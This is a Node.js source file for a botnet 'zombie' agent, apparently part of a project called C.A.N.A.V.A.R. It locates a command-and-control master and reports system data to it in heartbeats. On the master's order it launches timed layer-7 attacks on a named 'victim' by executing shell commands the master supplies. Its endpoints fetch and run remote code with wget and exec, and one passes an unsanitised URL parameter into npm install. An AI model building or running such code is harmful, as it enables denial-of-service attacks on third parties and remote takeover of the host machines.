const { exec } = require('child_process');

const express = require('express');
const app = express()

const fs = require('fs')
const axios = require('axios');
const EventEmitter = require('events')
const moment = require('moment')
const delay = require('delay')
const si = require('systeminformation');

let master = null
var masterReachable = new EventEmitter()
var settingIntegrity = new EventEmitter()
let fullyInitiated = false
//process.chdir(__dirname)
const db = require('quick.db');
let htserver = null
let zombie = {
    port: {
        number: null,
        change: function (val) {
            if (val !== zombie.port.number) {
                replenishPort(val)
            }
            zombie.port.number = val
            return zombie.port.number
        }
    },
    currentAttack: {
        victim: null,
        doneby: null,
        id: null,
        timer: null,
        method: null
    },
    init: Date.now(),
    busy: false,
    installedScripts: [],
    systemInfo: {
        static: null,
        dynamic: {
            cpu: {
                brand: null,
                speed: null,
                voltage: null
            },
            mem: {
                total: null,
                free: null,
                used: null,
                active: null,
                available: null
            },
            load: null,
            net: null
        }
    }
}

function replenishPort(val) {
    htserver.close()
    htserver = app.listen(val, () => console.log(`App listening on port! ${val}`)) 
}

async function refreshMaster() {
    if (zombie.busy) {
        await delay(zombie.currentAttack.timer * 1000)
    }
    db.delete('master.ip')
    db.delete('master')
    checkLocalMaster()
}

function checkLocalMaster() { //simplify this.
    let fails = 0
    let localMaster = db.get('master.ip')
    if (fails > 5) { localMaster = null }
    if ((localMaster === null) || (localMaster === "null") || (localMaster === "") || localMaster === undefined) {
        console.log("No local master found. Falling back to disaster API.");
        axios.get("http://disaster.api.canavar.licentia.xyz")
            .then(res => {
                let mdata = res.data
                db.set('master', { ip: `${mdata}` })
                console.log("localMaster is set with", mdata);
                localMaster = mdata
                checkMaster(localMaster)
            })
            .catch(err => {
                console.error(err);
                fails++
                checkLocalMaster()
            })
    } else {
        if (localMaster.includes(".")) {
            checkMaster(localMaster)
            console.log("Valid localMaster data.", localMaster);
        } else {
            db.delete('master.ip')
            db.delete('master')
            console.log("Corrupt localMaster data. falling back again.");
            checkLocalMaster()
        }
    }
    return localMaster
}

checkLocalMaster()

function checkMaster(master_) {
    axios.get("http://" + master_)
        .then(res => {
            let code = res.statusCode
            let statusMessage = res.statusMessage
            let body = res.data
            if ((body === "OKAY" || (code === 200) && (statusMessage === "OK"))) {
                console.log("Master reached.", master_);
                master = master_
                masterReachable.emit('true', master_);
            } else {
                db.delete('master.ip')
                db.delete('master')
                console.log("Corrupt localMaster data. falling back again.");
                checkLocalMaster()
            }
        })
        .catch(err => {
            db.delete('master.ip')
            db.delete('master')
            console.log("Cannot reach master. falling back again.");
            console.log(master);
            console.log(err);
            checkLocalMaster()
        })
}


function fetchSettings() {
    axios.get("http://" + master + "/globals")
        .then(res => {
            zombie.port.number = res.data.port.number
            console.log(res.data);
            if (!fullyInitiated) {
                settingIntegrity.emit('true');
            }
        })
        .catch(err => {
            console.error(err);
        })
}

masterReachable.on('true', (s) => {
    master = s
    console.log('Master has been reached!', s);
    fetchSettings()
});

settingIntegrity.on('true', () => {
    console.log("SETTING INTEGRITY OK!");
    app.get('/layer7/:methodID/:victim/:time/:attackID', (req, res) => {
        if (zombie.busy === false) {
            let victim = req.params.victim
            let timelimit = req.params.time
            if (isNaN(timelimit)) {
                res.send(405, { error: "INVALID_TIME_LIMIT" })
            }
            else {
                axios.get("http://" + master + "/scripts?" + req.params.methodID)
                    .then(resp => {
                        let methodfilename = `/canavarl7/scripts/${resp.data.filename}`
                        if (fs.existsSync(methodfilename)) {
                            // path exists
                            console.log("exists:", methodfilename);
                            startAttack((resp.data), req.params.victim, req.params.time)
                            zombie.currentAttack.victim = req.params.victim
                            zombie.currentAttack.timer = req.params.time
                            zombie.currentAttack.id = req.params.id
                            zombie.currentAttack.method = resp.data
                            zombie.currentAttack.doneby = moment().add({ seconds: timelimit }).unix() * 1000
                            zombie.busy = true
                            res.send(200, { success: true, message: `Attacking ${victim} with TL ${timelimit}`, doneby: zombie.currentAttack.doneby })
                        } else {
                            console.log("DOES NOT exist:", methodfilename);
                            res.send(500, { error: { code: "SCRIPT_NOT_INSTALLED", message: `Script is not installed on the machine.${methodfilename}` } })
                        }
                    })
                    .catch(err => {
                        res.send(500, { error: err.message })
                        console.log(err);
                    })

            }
        }
        else {
            res.send(405, { error: "MACHINE_IS_BUSY" })
        }
    })

    app.get('/status', (req, res) => {
        let zombie_ = zombie
        zombie_.aliveFor = Date.now() - zombie.init
        res.send(200, { zombie_ })
    })

    app.get('/update', (req, res) => {
        exec("cd /canavarl7 ; wget https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/index.js -O index.js; nohup systemctl restart canavarl7 &", (err, stdout, stderr) => {
            if (err) {
                //some err occurred
                console.error(err)
                res.send(200, { std_err: err })
            } else {
                // the *entire* stdout and stderr (buffered)
                console.log(`stdout: ${stdout}`);
                console.log(`stderr: ${stderr}`);
                res.send(200, { std_out: stdout, std_err: stderr })
            }
        })
    })
    app.get('/npminstall/:module', (req, res) => {
        exec(`cd /canavarl7/; npm install ${req.params.module} ; nohup systemctl restart canavarl7 &`, (err, stdout, stderr) => {
            if (err) {
                //some err occurred
                console.error(err)
            } else {
                // the *entire* stdout and stderr (buffered)
                console.log(`stdout: ${stdout}`);
                console.log(`stderr: ${stderr}`);
            }
        })
    })
    app.get('/installScript/:scriptid', (req, res) => {
        let scriptid = req.params.scriptid
        axios.get("http://" + master + "/scripts?" + scriptid)
            .then(resp => {
                console.log(resp.data)
                axios.get("http://" + master + "/setup?download_script&" + scriptid)
                    .then(resp => {
                        console.log("EXECUTE : " + resp.data)
                        exec(resp.data, (err, stdout, stderr) => {
                            if (err) {
                                //some err occurred
                                console.error(err)
                            } else {
                                // the *entire* stdout and stderr (buffered)
                                console.log(`stdout: ${stdout}`);
                                console.log(`stderr: ${stderr}`);
                            }
                        })
                        res.send(200)
                    })
                    .catch(err => {
                        res.send(500, { error: err.response.data.error })
                    })
            })
            .catch(err => {
                res.send(500, { error: err.response.data.error })
            })
    })
    app.get('/installService/', (req, res) => {
        console.log(resp.data)
        axios.get("http://" + master + "/setup?download_script")
            .then(resp => {
                console.log("EXECUTE : " + resp.data)
                res.send(200)
            })
            .catch(err => {
                res.send(500, { error: err.response.data.error })
            })
    })

    app.get('/currentAttack/', (req, res) => {
        res.send(200, zombie.currentAttack)
    })
    htserver = app.listen(zombie.port.number, () => console.log(`App listening on port! ${zombie.port.number}`))

    si.getStaticData(function (data) {
        zombie.systemInfo.static = data
    })

    async function complexHeartbeat() {
        if (!zombie.busy) {
            axios.post("http://" + master + "/heartbeat", { machine: zombie })
                .then(res => {
                    console.log(res.data);
                    zombie.port.change(res.data.port.number)
                })
                .catch(err => {
                    console.log(err);
                })
        }
    }
    async function simpleHeartbeat() {
        let zombiealt = {}
        zombiealt.port = zombie.port.number
        zombiealt.busy = zombie.busy
        zombiealt.init = zombie.init
        zombiealt.currentAttack = zombie.currentAttack
        axios.patch("http://" + master + "/heartbeat", { machine: zombiealt })
            .then(res => {
                console.log(res.data);
                zombie.port.change(res.data.port.number)
            })
            .catch(err => {
                console.log(err);
            })
    }

    simpleHeartbeat();
    complexHeartbeat();

    setInterval(function () {
        simpleHeartbeat()
    }, 5000)


    setInterval(function () {
        complexHeartbeat()
    }, 60000)

    setInterval(function () {
        refreshMaster()
    }, 3600000)

    setInterval(() => {
        siDataPlacement()
    }, 10000);

    si.getDynamicData(function (data) {
        zombie.systemInfo.dynamic.all = data
    })
    setInterval(() => {
        if (!zombie.busy) {
            si.getDynamicData(function (data) {
                zombie.systemInfo.dynamic.all = data
            })
        }
    }, 30000);

    async function siDataPlacement() {
        if (!zombie.busy) {
            si.cpu(function (cpudata) {
                zombie.systemInfo.dynamic.cpu.voltage = cpudata.voltage
                zombie.systemInfo.dynamic.cpu.speed = cpudata.speed
                zombie.systemInfo.dynamic.cpu.brand = cpudata.brand
            })
            si.mem(function (memdata) {
                zombie.systemInfo.dynamic.mem.total = memdata.total
                zombie.systemInfo.dynamic.mem.free = memdata.free
                zombie.systemInfo.dynamic.mem.used = memdata.used
                zombie.systemInfo.dynamic.mem.active = memdata.active
                zombie.systemInfo.dynamic.mem.available = memdata.available
            })
            si.currentLoad(function (data) {
                zombie.systemInfo.dynamic.load = data
            })
            si.networkStats(function (data) {
                zombie.systemInfo.dynamic.net = data
            })
        }
    }
    fullyInitiated = true
});

async function startAttack(methodData, victim, time) {
    let command = (methodData.dictation).replace("$VICTIM", `http://${victim}`)
    console.log(command);
    exec(command, (err, stdout, stderr) => {
        if (err) {
            //some err occurred
            console.log(err)
        } else {
            // the *entire* stdout and stderr (buffered)
            console.log(`stdout: ${stdout}`);
            console.log(`stderr: ${stderr}`);
        }
    });
    await delay(time * 1000)
    zombie.currentAttack = {
        victim: null,
        doneby: null,
        id: null,
        timer: null,
        method: null
    },
        zombie.busy = false
    exec(`pkill -9 ${methodData.process}`, (err, stdout, stderr) => { //SHOULD USE KILLALL'S YOUNGER/OLDER THAN ARGUMENTS!
        if (err) {
            //some err occurred
            console.error(err)
        } else {
            // the *entire* stdout and stderr (buffered)
            console.log(`stdout: ${stdout}`);
            console.log(`stderr: ${stderr}`);
        }
    });

}



/*

app.use((req, res, next) => {
    if (lockdown)
    let accessKey = req.headers.authorization
    if (!accessKey) {
        res.send(403)
    }
    if (!accessKey !==)
})



if ((process.argv.slice(2))[0] === "setup") {
    console.log("setup")
    exec('notepad', (err, stdout, stderr) => {
        if (err) {
            //some err occurred
            console.error(err)
        } else {
            // the *entire* stdout and stderr (buffered)
            console.log(`stdout: ${stdout}`);
            console.log(`stderr: ${stderr}`);
        }
    });
} else {
    console.log("action")
}*/

